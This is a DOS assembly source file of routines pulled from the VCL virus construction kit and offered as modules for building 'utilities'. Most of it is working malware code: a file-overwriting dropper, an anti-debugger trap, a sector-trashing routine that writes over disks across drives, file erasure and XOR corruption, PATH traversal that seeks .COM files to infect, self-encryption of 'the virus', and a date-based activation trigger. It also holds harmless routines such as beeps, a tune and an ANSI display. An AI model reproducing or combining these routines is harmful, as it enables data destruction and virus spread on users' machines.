;These routines were pulled from the VCL as an aid to those who
;wish to write themselves some utilities. I have tried to gather
;all the essential pieces of the routines, so that you can simply
;install them in modules.
;
;
;
;
;This is a DROPPER routine from the VCL.


                mov     dx,offset data00        ; DX points to data
		mov	si,offset data01	; SI points to data
		push	di			; Save DI
		mov	ah,02Fh			; DOS get DTA function
		int	021h
		mov	di,bx			; DI points to DTA
		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		int	021h
		jc	create_file		; If not found then create it
write_in_file:	mov	ax,04301h		; DOS set file attributes function
		xor	cx,cx			; File will have no attributes
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		mov	ax,03D01h		; DOS open file function, write
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		xchg	bx,ax			; Transfer file handle to AX
		mov	ah,040h			; DOS write to file function
		mov	cx,[si]			; CX holds number of byte to write
		lea	dx,[si + 2]		; DX points to the data
		int	021h
		mov	ax,05701h		; DOS set file date/time function
		mov	cx,[di + 016h]		; CX holds old file time
		mov	dx,[di + 018h]		; DX holds old file data
		int	021h
		mov	ah,03Eh			; DOS close file function
		int	021h
		mov	ax,04301h		; DOS set file attributes function
		xor	ch,ch			; Clear CH for attributes
		mov	cl,[di + 015h]		; CL holds old attributes
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		mov	ah,04Fh			; DOS find next file function
		int	021h
		jnc	write_in_file		; If successful do next file
		jmp	short dropper_end	; Otherwise exit
create_file:	mov	ah,03Ch			; DOS create file function
		xor	cx,cx			; File has no attributes
		int	021h
		xchg	bx,ax			; Transfer file handle to AX
		mov	ah,040h			; DOS write to file function
		mov	cx,[si]			; CX holds number of byte to write
		lea	dx,[si + 2]		; DX points to the data
		int	021h
		mov	ah,03Eh			; DOS close file function
		int	021h
dropper_end:	pop	di			; Restore DI


		mov	ax,04C00h		; DOS terminate function
                int     021h

;This is a STOP TRACE technique for fouling up DEBUGGERS


stop_tracing:	mov	cx,09EBh
		mov	ax,0FE05h		; Acutal move, plus a HaLT
		jmp	$-2
		add	ah,03Bh			; AH now equals 025h
		jmp	$-10			; Execute the HaLT
		mov	bx,offset null_vector	; BX points to new routine
		push	cs			; Transfer CS into ES
		pop	es			; using a PUSH/POP
		int	021h
		mov	al,1			; Disable interrupt 1, too
		int	021h
		jmp	short skip_null		; Hop over the loop
null_vector:	jmp	$			; An infinite loop
skip_null:	mov	byte ptr [lock_keys + 1],130  ; Prefetch unchanged
lock_keys:	mov	al,128			; Change here screws DEBUG
		out	021h,al			; If tracing then lock keyboard

;This is a TRASH routine for destroying sectors


		mov	ax,0002h		; First argument is 2
		mov	cx,0001h		; Second argument is 1
		cli				; Disable interrupts (no Ctrl-C)
		cwd				; Clear DX (start with sector 0)
trash_loop:	int	026h			; DOS absolute write interrupt
		dec	ax			; Select the previous disk
		cmp	ax,-1			; Have we gone too far?
		jne	trash_loop		; If not, repeat with new drive
		sti				; Restore interrupts

;This is a FILE ERASE routine


		mov	dx,offset data02	; DX points to data
		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; All file attributes valid
		int	021h
		jc	erase_done		; Exit procedure on failure
		mov	ah,02Fh			; DOS get DTA function
		int	021h
		lea	dx,[bx + 01Eh]		; DX points to filename in DTA
erase_loop:	mov	ah,041h			; DOS delete file function
		int	021h
		mov	ah,03Ch			; DOS create file function
		xor	cx,cx			; No attributes for new file
		int	021h
		mov	ah,041h			; DOS delete file function
		int	021h
		mov	ah,04Fh			; DOS find next file function
		int	021h
		jnc	erase_loop		; Repeat until no files left
erase_done:

		mov	ax,04C00h		; DOS terminate function
		int	021h

;This is a DIRECTORY "PATH"/ FILE FIND routine


search_files	proc	near
		mov	bx,di			; BX points to the virus
		push	bp			; Save BP
		mov	bp,sp			; BP points to local buffer
		sub	sp,135			; Allocate 135 bytes on stack

		mov	byte ptr [bp - 135],'\'	; Start with a backslash

		mov	ah,047h			; DOS get current dir function
		xor	dl,dl			; DL holds drive # (current)
		lea	si,[bp - 134]		; SI points to 64-byte buffer
		int	021h

		call	traverse_path		; Start the traversal

traversal_loop:	cmp	word ptr [bx + path_ad],0	; Was the search unsuccessful?
		je	done_searching		; If so then we're done
		call	found_subdir		; Otherwise copy the subdirectory

		mov	ax,cs			; AX holds the code segment
		mov	ds,ax			; Set the data and extra
		mov	es,ax			; segments to the code segment

		xor	al,al			; Zero AL
		stosb				; NULL-terminate the directory

		mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 70]		; DX points to the directory
		int	021h

		lea	dx,[bx + com_mask]	; DX points to "*.COM"
		push	di
		mov	di,bx
		call	find_files		; Try to infect a .COM file
		mov	bx,di
		pop	di
		jnc	done_searching		; If successful the exit
		jmp	short traversal_loop	; Keep checking the PATH

done_searching:	mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 135]		; DX points to old directory
		int	021h

		cmp	word ptr [bx + path_ad],0	; Did we run out of directories?
		jne	at_least_tried		; If not then exit
		stc				; Set the carry flag for failure
at_least_tried:	mov	sp,bp			; Restore old stack pointer
		pop	bp			; Restore BP
		ret				; Return to caller
com_mask	db	"*.COM",0		; Mask for all .COM files
search_files	endp

traverse_path	proc	near
		mov	es,word ptr cs:[002Ch]	; ES holds the enviroment segment
		xor	di,di			; DI holds the starting offset

find_path:	lea	si,[bx + path_string]	; SI points to "PATH="
		lodsb				; Load the "P" into AL
		mov	cx,08000h		; Check the first 32767 bytes
	repne	scasb				; Search until the byte is found
		mov	cx,4			; Check the next four bytes
check_next_4:	lodsb				; Load the next letter of "PATH="
		scasb				; Compare it to the environment
		jne	find_path		; If there not equal try again
		loop	check_next_4		; Otherwise keep checking

		mov	word ptr [bx + path_ad],di	; Save the PATH address
		mov	word ptr [bx + path_ad + 2],es  ; Save the PATH's segment
		ret				; Return to caller

path_string	db	"PATH="			; The PATH string to search for
path_ad		dd	?			; Holds the PATH's address
traverse_path	endp

found_subdir	proc	near
		lds	si,dword ptr [bx + path_ad]	; DS:SI points to PATH
		lea	di,[bp - 70]		; DI points to the work buffer
		push	cs			; Transfer CS into ES for
		pop	es			; byte transfer
move_subdir:	lodsb				; Load the next byte into AL
		cmp	al,';'			; Have we reached a separator?
		je	moved_one		; If so we're done copying
		or	al,al			; Are we finished with the PATH?
		je	moved_last_one		; If so get out of here
		stosb				; Store the byte at ES:DI
		jmp	short move_subdir	; Keep transfering characters

moved_last_one:	xor	si,si			; Zero SI to signal completion
moved_one:	mov	word ptr es:[bx + path_ad],si  ; Store SI in the path address
		ret				; Return to caller
found_subdir	endp

find_files	proc	near
		push	bp			; Save BP

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		push	dx			; Save file mask
		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		pop	dx			; Restore file mask
find_a_file:	int	021h
		jc	done_finding		; Exit if no files found
		call	infect_file		; Infect the file!
		jnc	done_finding		; Exit if no error
		mov	ah,04Fh			; DOS find next file function
		jmp	short find_a_file	; Try finding another file

done_finding:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah			; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller
find_files	endp


;This is a RAM REDUCTION routine


		mov	dx,0064h		; First argument is 100
		push	es			; Save ES
		mov	ax,040h			; Set extra segment to 040h
		mov	es,ax                   ; (ROM BIOS)
		mov	word ptr es:[013h],dx	; Store new RAM ammount
		pop	es			; Restore ES

		mov	ah,0Fh			; BIOS get video mode function
		int	010h
		xor	ah,ah			; BIOS set video mode function
		int	010h


;This is a MACHINE GUN SOUND routine followed by a DROP TO ROM routine


		mov	cx,0005h		; First argument is 5
new_shot:       push	cx			; Save the current count
		mov 	dx,0140h		; DX holds pitch
		mov   	bx,0100h		; BX holds shot duration
		in    	al,061h			; Read the speaker port
		and   	al,11111100b		; Turn off the speaker bit
fire_shot:	xor	al,2                    ; Toggle the speaker bit
		out	061h,al			; Write AL to speaker port
		add     dx,09248h		;
		mov	cl,3                    ;
		ror	dx,cl			; Figure out the delay time
		mov	cx,dx                   ;
		and	cx,01FFh                ;
		or	cx,10                   ;
shoot_pause:	loop	shoot_pause             ; Delay a bit
		dec	bx			; Are we done with the shot?
		jnz	fire_shot		; If not, pulse the speaker
		and   	al,11111100b		; Turn off the speaker bit
		out   	061h,al			; Write AL to speaker port
		mov   	bx,0002h                ; BX holds delay time (ticks)
		xor   	ah,ah			; Get time function
		int   	1Ah			; BIOS timer interrupt
		add   	bx,dx                   ; Add current time to delay
shoot_delay:    int   	1Ah			; Get the time again
		cmp   	dx,bx			; Are we done yet?
		jne   	shoot_delay		; If not, keep checking
		pop	cx			; Restore the count
		loop	new_shot		; Do another shot

		int	018h			; Drop to ROM BASIC


		mov	ax,04C00h		; DOS terminate function
		int	021h


;This is a DISPLAY STRING routine


main		proc	near
		mov	si,offset data00	; SI points to data
		mov	ah,0Eh			; BIOS display char. function
display_loop:   lodsb				; Load the next char. into AL
		or	al,al			; Is the character a null?
		je	disp_strnend		; If it is, exit
		int	010h			; BIOS video interrupt
		jmp	short display_loop	; Do the next character
disp_strnend:


This is a RANDOM NUMBER from BIOS CLOCK generator


get_random      proc	near
		xor	ah,ah			; BIOS get clock count function
		int	01Ah
		xchg	dx,ax			; Transfer the count into AX
		ret				; Return to caller
get_random      endp


This is an CODE ENCRYPTION routine


encrypt_code	proc	near
		mov	si,offset encrypt_decrypt; SI points to cipher routine

		xor	ah,ah			; BIOS get time function
		int	01Ah
		mov	word ptr [si + 8],dx	; Low word of timer is new key

		xor	byte ptr [si],1		;
		xor	byte ptr [si + 7],1	; Change all SIs to DIs
		xor	word ptr [si + 10],0101h; (and vice-versa)

		mov	di,offset finish	; Copy routine into heap
		mov	cx,finish - encrypt_decrypt - 1  ; All but final RET
		push	si			; Save SI for later
		push	cx			; Save CX for later
	rep	movsb				; Copy the bytes

		mov	si,offset write_stuff	; SI points to write stuff
		mov	cx,5			; CX holds length of write
	rep	movsb				; Copy the bytes

		pop	cx			; Restore CX
		pop	si			; Restore SI
		inc	cx			; Copy the RET also this time
	rep	movsb				; Copy the routine again

		mov	ah,040h			; DOS write to file function
		mov	dx,offset start		; DX points to virus

		call	finish			; Encrypt/write/decrypt

		ret				; Return to caller

write_stuff:	mov	cx,finish - start	; Length of code
		int	021h
encrypt_code	endp

end_of_code	label	near

encrypt_decrypt	proc	near
		mov	si,offset start_of_code ; SI points to code to decrypt
		mov	cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:	db	081h,034h,00h,00h	; XOR a word by the key
		inc	si			; Do the next word
		inc	si			;
		loop	xor_loop		; Loop until we're through
		ret				; Return to caller
encrypt_decrypt	endp


;This is a BEEP routine


beep            proc	near
		jcxz	beep_end		; Exit if there are no beeps
		mov	ax,0E07h		; BIOS display char., BEL
beep_loop:	int	010h			; Beep
		loop	beep_loop		; Beep until --CX = 0
beep_end:
		ret				; Return to caller
beep            endp


;This is a GET DAY/WEEK COMPARE BEFORE ACTIVATE routine


		call	get_day
		cmp	ax,000Bh		; Did the function return 11?
		jne	skip00			; If not equal, skip effect
		call	get_weekday
		cmp	ax,0005h		; Did the function return 5?
		jne	skip00			; If not equal, skip effect
		jmp	short strt00		; Success -- skip jump
skip00:		jmp	end00			; Skip the routine
strt00:		mov	si,offset data00	; SI points to data
		mov	ah,0Eh			; BIOS display char. function

;Code goes between this-------------------------------->

get_day         proc    near
		mov	ah,02Ah			; DOS get date function
		int	021h
		mov	al,dl			; Copy day into AL
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_day         endp

get_weekday     proc	near
		mov	ah,02Ah			; DOS get date function
		int	021h
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_weekday     endp


;This is a FILE CORRUPTION routine


		mov	dx,offset data01	; DX points to data
		push	bp			; Save BP
		mov	bp,sp			; BP points to stack frame
		sub	sp,4096			; Allocate 4096-byte buffer
		push	di			; Save DI
		mov	ah,02Fh			; DOS get DTA function
		int	021h
		mov	di,bx			; DI points to DTA
		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		int	021h
		jc      corrupt_end		; If no files found then exit
corrupt_file:	mov	ax,04301h		; DOS set file attributes function
		xor	cx,cx			; File will have no attributes
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		mov	ax,03D02h		; DOS open file function, r/w
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		xchg	bx,ax			; Transfer file handle to AX
c_crypt_loop:	mov	ah,03Fh			; DOS read from file function
		mov	cx,4096			; Read 4k of characters
		lea	dx,[bp - 4096]		; DX points to the buffer
		int	021h
		or	ax,ax			; Were 0 bytes read?
		je	close_c_file		; If so then close it up
		push	ax			; Save AX
		lea	si,[bp - 4096]		; SI points to the buffer
		xor	ah,ah			; BIOS get clock ticks function
		int	01Ah
		pop	cx			; CX holds number of bytes read
		push	cx			; Save CX
corrupt_bytes:	xor	byte ptr [si],dl	; XOR byte by clock ticks
		inc	si			; Do the next byte
		inc	dx			; Change the key for next byte
		loop	corrupt_bytes		; Repeat until buffer is done
		pop	dx			; Restore DX (holds bytes read)
		push	dx			; Save count for write
		mov	ax,04201h		; DOS file seek function, current
		mov	cx,0FFFFh		; Seeking backwards
		neg	dx			; Seeking backwards
		int	021h
		mov	ah,040h			; DOS write to file function
		pop	cx			; CX holds number of bytes read
		lea	dx,[bp - 4096]		; DX points to the buffer
		int	021h
		jmp	short c_crypt_loop
close_c_file:	mov	ax,05701h		; DOS set file date/time function
		mov	cx,[di + 016h]		; CX holds old file time
		mov	dx,[di + 018h]		; DX holds old file data
		int	021h
		mov	ah,03Eh			; DOS close file function
		int	021h
		mov	ax,04301h		; DOS set file attributes function
		xor	ch,ch			; Clear CH for attributes
		mov	cl,[di + 015h]		; CL holds old attributes
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		mov	ah,04Fh			; DOS find next file function
		int	021h
		jnc	corrupt_file		; If successful do next file
corrupt_end:	pop	di			; Restore DI
		mov	sp,bp			; Deallocate local buffer
		pop	bp			; Restore BP


;This is a COM PORT REARRANGING routin


		mov	bx,0001h		; First argument is 1
		mov	si,0002h		; Second argument is 2
		push	es			; Save ES
		xor	ax,ax			; Set the extra segment to
		mov	es,ax                   ; zero (ROM BIOS)
		shl	bx,1			; Convert to word index
		shl	si,1			; Convert to word index
		mov	ax,word ptr [bx + 03FEh]; Zero COM port address
		xchg	word ptr [si + 03FEh],ax; Put first value in second,
		mov	word ptr [bx + 03FEh],ax; and second value in first!
		pop	es			; Restore ES


;This is a DROP TO ROM routine


rom_basic       proc	near
		int	018h			; Drop to ROM BASIC
		ret				; Return to caller
rom_basic       endp


;This is a TUNE PLAYING routine + TUNE DATA


		mov	si,offset data00	; SI points to data
get_note:	mov	bx,[si]			; Load BX with the frequency
		or	bx,bx			; Is BX equal to zero?
		je      play_tune_done		; If it is we are finished

		mov	ax,034DDh		;
		mov	dx,0012h                ;
		cmp	dx,bx                   ;
		jnb	new_note                ;
		div	bx                      ; This bit here was stolen
		mov	bx,ax                   ; from the Turbo C++ v1.0
		in	al,061h                 ; library file CS.LIB.  I
		test	al,3                    ; extracted sound() from the
		jne	skip_an_or              ; library and linked it to
		or	al,3                    ; an .EXE file, then diassembled
		out	061h,al                 ; it.  Basically this turns
		mov	al,0B6h                 ; on the speaker at a certain
		out	043h,al                 ; frequency.
skip_an_or:	mov	al,bl                   ;
		out	042h,al                 ;
		mov	al,bh                   ;
		out	042h,al                 ;

		mov	bx,[si + 2]		; BX holds duration value
		xor	ah,ah			; BIOS get time function
		int	1Ah
		add	bx,dx			; Add the time to the length
wait_loop:  	int	1Ah                     ; Get the time again (AH = 0)
		cmp	dx,bx			; Is the delay over?
		jne	wait_loop		; Repeat until it is

		in	al,061h			; Stolen from the nosound()
		and	al,0FCh                 ; procedure in Turbo C++ v1.0.
		out	061h,al                 ; This turns off the speaker.

new_note:	add	si,4			; SI points to next note
		jmp	short get_note		; Repeat with the next note
play_tune_done:


data00		dw	262,6,262,6,293,6,329,6,262,6,329,6,293,6,196,6
		dw	262,6,262,6,293,6,329,6,262,12,262,12
		dw	262,6,262,6,293,6,329,6,349,6,329,6,293,6,262,6
		dw	246,6,196,6,220,6,246,6,262,12,262,12
		dw	220,6,246,6,220,6,174,6,220,6,246,6,262,6,220,6
		dw	196,6,220,6,196,6,174,6,164,6,174,6,196,7
		dw	220,6,246,6,220,6,174,6,220,6,246,6,262,6,220,7
		dw	196,6,262,6,246,6,293,6,262,12,262,12
		dw	0


;This is an ANSI DISPLAY routine



		mov	si,offset data01	; SI points to data
		xor	cx,cx			; Clear CX
		push	di                      ; Save DI
		push	es			; Save ES

		jcxz	uncrunch_done		; Exit if there are no characters

		mov	ah,0Fh          	; BIOS get screen mode function
		int	10h
		xor	ah,ah           	; BIOS set screen mode function
		int	10h             	; Clear the screen

		xor	di,di
		mov	ax,0B800h		; AX is set to video segment
		mov	es,ax			; ES holds video segment

		mov	dx,di			; Save X coordinate for later
		xor	ax,ax			; Set current attributes
		cld

loopa:		lodsb				; Get next character
		cmp	al,32			; Is it a control character?
		jb	foreground		; Handle it if it is
		stosw				; Save letter on screen
next:		loop	loopa			; Repeat until we're done
		jmp	short uncrunch_done	; Leave this routine

foreground:	cmp	al,16			; Are we changing the foreground?
		jnb	background		; If not, check the background
		and	ah,0F0h			; Strip off old foreground
		or	ah,al			; Put the new one on
		jmp	short next		; Resume looping

background:	cmp	al,24			; Are we changing the background?
		je	next_line		; If AL = 24, go to next line
		jnb	flash_bit_toggle	; If AL > 24 set the flash bit
		sub	al,16   		; Change AL to a color number
		add	al,al			; Crude way of shifting left
		add	al,al                   ; four bits without changing
		add	al,al                   ; CL or wasting space.  Ok,
		add	al,al                   ; I guess.
		and	al,08Fh			; Strip off old background
		or	ah,al			; Put the new one on
		jmp	short next		; Resume looping

next_line:	add	dx,160			; Skip a whole line (80 chars.
		mov	di,dx			; AND 80 attribs.)
		jmp	short next		; Resume looping

flash_bit_toggle: cmp	al,27			; Is it a blink toggle?
		jb	multi_output		; If AL < 27, it's a blinker
		jne	next			; Otherwise resume looping
		xor	ah,128			; Toggle the flash bit
		jmp	short next		; Resume looping

multi_output:   cmp	al,25			; Set Zero flag if multi-space
		mov	bx,cx			; Save main counter
		lodsb				; Get number of repititions
		mov	cl,al			; Put it in CL
		mov	al,' '			; AL holds a space
		jz	start_output		; If displaying spaces, jump
		lodsb				; Otherwise get character to use
		dec	bx			; Adjust main counter

start_output:	xor	ch,ch			; Clear CH
		inc	cx			; Add one to count
	rep	stosw				; Display the character
		mov	cx,bx			; Restore main counter
		dec	cx			; Adjust main counter
		loopnz	loopa			; Resume looping if not done

uncrunch_done:	pop	es			; Restore ES
		pop	di			; Restore DI


		mov	ax,04C00h		; DOS terminate function
		int	021h



